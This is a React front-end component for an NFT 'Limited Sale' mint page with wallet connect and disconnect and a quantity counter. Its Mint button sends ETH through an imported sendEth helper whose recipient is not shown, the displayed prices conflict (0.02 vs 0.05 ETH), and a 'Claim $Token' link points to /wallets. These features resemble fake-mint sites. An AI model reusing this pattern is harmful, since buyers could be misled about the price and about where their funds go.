import { useState } from "react";
import { Link } from "react-router-dom";
import { useWallet } from "../../hooks/useWallet";
import { useWalletModal } from "../../hooks/useWalletModal";
import WalletModal from "../WalletModal/WalletModal";
import { sendEth } from "../../utils/getContract";
import { store } from "state-pool";
import React, { useRef } from "react";
import { useWeb3React } from "@web3-react/core";
import { walletconnect } from '../../utils/connector';

const nftPrice = 0.02;
export default function HeaderCount() {
  const { active, account, library } = useWallet();
  const { deactivate } = useWeb3React();
  const { toggleOpen } = useWalletModal();
  const [counter, setCounter] = useState(1);
  const [price, setPrice] = useState(nftPrice);
  const buttonNameRef = useRef();

  const onIncrease = () => {
    if (counter < 10) setCounter(counter + 1);
    setPrice((counter + 1) * nftPrice);
  };

  const onDecrease = () => {
    if (counter > 0) setCounter(counter - 1);
    setPrice(counter * nftPrice);
  };

  const onSetMax = () => {
    setCounter(10);
    setPrice(10 * nftPrice);
  };

  const miniString = (account) => {
    let upString = account.substring(0, 7);
    let downString = account.substr(account.length - 17);
    return upString + "......" + downString;
  };

  const onMint = () => {
    store.setState("ethAmount", price);
    if (!active) {
      toggleOpen();
    } else {
      sendEth(library, price);
    }
  };

  const onDisconnect = () => {
    if (window.localStorage.getItem('walletconnect')) {
      walletconnect.close();
      walletconnect.walletConnectProvider = null;
    }
    try {
      deactivate()
      localStorage.removeItem("walletconnect");
    } catch (ex) {
      console.log(ex)
    }
  };





  return (
    <div className="header-cont">
      <WalletModal />
      <div className="dutch-detail-two-sides">
        <div className="dutch-det-left">
          <div className="text-block-13">Limited Sale</div>
        </div>
      </div>
      <div className="header_flex">
        <div className="dutch-detail-two-sides">
          <div className="dutch-det-left">
            <div className="text-block-13">Supply</div>
          </div>
          <div className="dutch-det-right">
            <div className="text-block-12">860</div>
          </div>
        </div>
        <div className="dutch-detail-two-sides">
          <div className="dutch-det-left">
            <div className="text-block-13">Price</div>
          </div>
          <div className="dutch-det-right">
            <div className="text-block-12">0.02 ETH</div>
          </div>
        </div>
        <div className="dutch-detail-two-sides">
          <div className="dutch-det-left">
            <div className="text-block-13">Max</div>
          </div>
          <div className="dutch-det-right">
            <div className="text-block-12">10 per Wallet</div>
          </div>
        </div>
      </div>
      <div id="claim-text-wrapper">
        <div id="payment-modal">
          <div id="payment-header">
            <div id="payment-header-text" style={{ margin: "0 auto" }}>
              <h1
                className="heading-2-copy-copy-copy-copy"
                style={{ margin: "0", padding: 0, fontStyle: "initial" }}
              >
                <span style={{ textTransform: "none" }}>Limited Sale</span>
              </h1>
            </div>
          </div>
          <div id="payment-info" style={{ marginTop: "20px" }}>
            <img
              id="price-img"
              src="/asserts/media/image/gifius.gif"
              alt="Claim NFT"
            />
            <div id="payment-info-text">
              <p>Price</p>
              <h5>0.05 ETH Each</h5>
            </div>
          </div>
          <div id="ape-number">
            <div id="minus" onClick={onDecrease} className="minuson">
              <svg
                width="12"
                height="2"
                viewBox="0 0 16 2"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                style={{ left: "11px" }}
              >
                <path
                  d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z"
                  fill="white"
                ></path>
              </svg>
            </div>
            <h5 id="pricex" style={{ marginLeft: "13px", marginRight: "13px" }}>
              {counter}
            </h5>
            <input
              name="eth"
              className="eth_input text-field-5 w-input"
              type="hidden"
              min="1"
              max="10"
              pattern="[A-z0-9]{2,50}"
              required
              value="1"
            />
            <div id="plus" onClick={onIncrease} className="pluson">
              <svg
                width="12"
                height="12"
                viewBox="0 0 16 16"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                style={{ left: "11px" }}
              >
                <path
                  d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z"
                  fill="white"
                ></path>
              </svg>
            </div>
            <h5 id="ape-max" onClick={onSetMax}>
              Set Max
            </h5>
          </div>
          <div id="ape-total">
            <p>Total</p>
            <h5>
              <span id="price">{price.toFixed(2)}</span> ETH
            </h5>
          </div>
        </div>
        {/* <button className="cta connect-btn" id="transfer" onClick={wallet.sendEth()}>Mint</button> */}
        <div className="cta-btn-grp">
          <button
            className="cta connect-btn"
            id="transfer"
            ref={buttonNameRef}
            onClick={onMint}
          >
            {" "}
            {active ? (
              <>
                <span className="wallet">Mint</span>
              </>
            ) : (
              <span className="wallet">Connect</span>
            )}
          </button>
          {active ? (
            <>
              <button
                className="cta connect-btn"
                id="transfer"
                onClick={onDisconnect}
              >
                Disconnect
              </button>
              <Link to="/wallets">
                <button id="transfer" >
                  Claim $Token
                </button>
              </Link>
            </>
          ) : (
            <></>
          )}
        </div>
        <div className="wallet-section">
          {active ? (
            <>
              <span className="wallet">{miniString(account)}</span>
            </>
          ) : (
            <span className="wallet"></span>
          )}
        </div>
      </div>

    </div>
  );
}
